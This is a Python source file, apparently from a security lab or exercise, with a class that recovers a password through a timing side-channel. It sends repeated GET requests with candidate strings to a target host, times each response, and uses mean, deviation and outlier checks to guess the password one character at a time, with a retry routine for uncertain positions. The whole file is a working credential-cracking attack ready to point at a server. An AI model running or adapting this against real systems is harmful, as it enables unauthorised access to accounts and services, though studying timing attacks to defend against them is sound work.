import copy
import sys
import math
import http.client
import pprint
import time

class Stage3():

    def __init__(self, URL):
        self.NUM_OF_SAMPLES_DEFAULT = 6
        self.SAMPLE_PROCEED = 1
        self.SAMPLE_BACK = 2
        self.THRESHOLD = 1.5
        
        self.URL = URL
        self.charTimes = {}
        self.outlayerFlag=False
        self.POOL = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K',
                'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y',
                'Z', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u',
                'v', 'w', 'x', 'y', 'z']

    def mean(self,myDict):
        sum = 0.0
        for key in myDict.keys():
            sum+=myDict[key]
        return sum /len(myDict)

    def standardDeviation(self,myDict):
        smean=self.mean(myDict)
        tempSum = 0
        for a in myDict.keys():

            tempSum += (myDict[a] - smean)*(myDict[a] - smean)


        return math.sqrt(tempSum /len(myDict))


    def outliers(self,myDict, threshold):
        smean = self.mean(myDict)
        sd = self.standardDeviation(myDict)

        outLierDict = {}
        for key in myDict.keys():
            if myDict[key] <smean - (sd * threshold):
                outLierDict[key] = myDict[key]

        return outLierDict
    def sampleOk(self ,myDict,threshold):
        candidates = self.outliers(myDict, threshold)
        print ("candidates:",candidates)
        if len(candidates) > 1:
            return self.SAMPLE_BACK
        return self.SAMPLE_PROCEED
    def getURLparam(self,psf):
        return "/index/" +psf
    def dictToPool(self,myDict):
        myPool=[]
        for key in myDict.keys():
            myPool.append(key)

        return myPool

    def sendRequest2(self,psf):
    

        passParam = self.getURLparam(psf)

        connection = http.client.HTTPConnection(self.URL)

        startTime = time.time_ns()
        connection.request("GET", passParam)
        response = connection.getresponse()
        responseDelay = time.time_ns() - startTime
        ans = response.read().decode("utf-8")

        #print("response delay: " ,responseDelay)
        if ans[0] == "1":
            print("we found the password!!")

        return responseDelay,ans[0]

    def min(self,myDict):
        mins = sys.maxsize
        selectKey = '_'
        for key in myDict.keys():
            if myDict[key] < mins:
                mins = myDict[key]
                selectKey = key
        return selectKey

    def findPass3(self, passLen):
        self.passLen = passLen
        self.currentPOOL = copy.deepcopy(self.POOL)
        self.psf = ''
        self.passIndex = 0
        self.currPsf=''
        while self.passIndex < self.passLen:
            self.outlayerFlag=False
            for j in self.currentPOOL:
                
                self.maxTime = sys.maxsize
                self.currPsf=(self.psf+j).ljust(self.passLen,'_')
                
                
                numOfSamples=self.NUM_OF_SAMPLES_DEFAULT
                if self.outlayerFlag:
                    numOfSamples*=5

                
                found =self.selectMin(j,numOfSamples)
                print ("current pass check :"+self.currPsf,self.maxTime)              
                if found=='1':
                    print ("found")
                    print("I've decided this " +j)
                    self.Psf=self.currPsf
                    return self.Psf ,"1"
                '''   
                for a in range (self.NUM_OF_SAMPLES_DEFAULT):
                    s = self.sendRequest2(self.currPsf)
                     
                    if s[0] < self.maxTime:
                        self.maxTime = s[0]

                    
                        self.charTimes[j]=self.maxTime
                    if s[1]=='1':
                        print ("found")
                        self.psf+= j
                        print("I've decided this " +j)
                        return self.psf ,"1"
                    '''

            minKey= self.min(self.charTimes)
           
            print ("current pass time: ",self.psf ,self.charTimes[minKey])

            ans = self.sampleOk(self.charTimes,self.THRESHOLD)
            if (ans == self.SAMPLE_PROCEED) :
                self.outlayerFlag=True
                self.currentPOOL = copy.deepcopy(self.POOL)
                print("I've decided this " + minKey)
                self.psf+=minKey
                self.passIndex+=1

            else:
                print("we found outliers on: " ,self.passIndex)
                self.currentPOOL =self.dictToPool(self.outliers(self.charTimes, self.THRESHOLD))
        
        s = self.sendRequest2(self.psf)
        return self.psf,s[1]
    def selectMin(self,j,numSamples):
        for a in range (numSamples):
            s = self.sendRequest2(self.currPsf)
            
            if s[0] < self.maxTime:
                self.maxTime = s[0]
                found=s[1]

            
        self.charTimes[j]=self.maxTime
        return found
    def selectAver(self,j,numSamples):
        av=[]
        for a in range (numSamples):
            s = self.sendRequest2(self.currPsf)
            av.append(s)
                   

                    
                  
        sum1=0
        for s in av:
            sum1+=s[0]
            found=s[1]
        self.maxTime =sum1/numSamples
        self.charTimes[j]=self.maxTime
        return found
    def selectSmoothAver(self,j,numSamples):
        av=[]
        if numSamples>3:
            for a in range (numSamples):
                s = self.sendRequest2(self.currPsf)
                av.append(s)
                   
                        
            sum1=0
            min1=[sys.maxsize,"0"] 
            max1=[0,"0"]
            for s in av:
                if s[0] <min1[0]:
                    min1=s
            av.remove(min1)
            for s in av:
                if s[0] >max1[0]:
                    max1=s
            av.remove(max1)


            for s in av:
                sum1+=s[0]
                found=s[1]
            self.maxTime= sum1/(numSamples-2)
            self.charTimes[j]=self.maxTime
            return found
        else:
            return self.selectAver(j,numSamples)

    def redo(self,redoList):
        self.pools=redoList[0]
        self.Psf=redoList[1]
        self.passLen=len(self.Psf)
        self.indexes= [pos for pos, char in enumerate(self.Psf) if char == '_']
        print ("indexs  ",self.indexes, self.Psf)
        self.passIndex=0
        self.numRedos=len(self.pools)
        self.curntRedo=0
        self.currentPOOL = copy.deepcopy(self.pools.pop(0))
        self.currentPOOL = copy.deepcopy(self.POOL)
        self.currPsf=''
        while  self.curntRedo<self.numRedos:
            self.charTimes={}
            for j in self.currentPOOL:
                    
                self.maxTime = sys.maxsize
                print (self.indexes ,self.passIndex)
                self.currPsf=self.Psf[:self.indexes[self.passIndex]]+j+self.Psf[self.indexes[self.passIndex]+1:]
                
                print ("current pass check :"+self.currPsf)
                found =self.selectMin(j,self.NUM_OF_SAMPLES_DEFAULT*5)
            
                    
                if found=='1':
                    print ("found")
                    print("I've decided this " +j)
                    self.Psf=self.currPsf
                    return self.Psf ,"1"
                    

            minKey= self.min(self.charTimes)
            self.currPsf=self.Psf[:self.indexes[self.passIndex]]+minKey+self.Psf[self.indexes[self.passIndex]+1:]
            self.Psf=self.currPsf
            print ("current pass time: ",self.Psf,minKey,self.charTimes[minKey])
            print(self.charTimes)
            ans = self.sampleOk(self.charTimes,self.THRESHOLD)
            if (ans == self.SAMPLE_PROCEED) :
                
                
                
                self.currPsf=self.Psf[:self.indexes[self.passIndex]]+minKey+self.Psf[self.indexes[self.passIndex]+1:]
                self.Psf=self.currPsf
                self.passIndex+=1
                self.curntRedo+=1
                if self.pools:
                    self.currentPOOL = copy.deepcopy(self.pools.pop(0))
                self.currentPOOL = copy.deepcopy(self.POOL)
                print("I've decided this " + minKey,self.Psf)                            
            else:
                print("we found outliers: " ,self.indexes[self.passIndex])
                #self.currentPOOL = copy.deepcopy(self.POOL)
                self.currentPOOL =self.dictToPool(self.outliers(self.charTimes, self.THRESHOLD))
               
        s = self.sendRequest2(self.Psf)
        return self.Psf,s[1]

        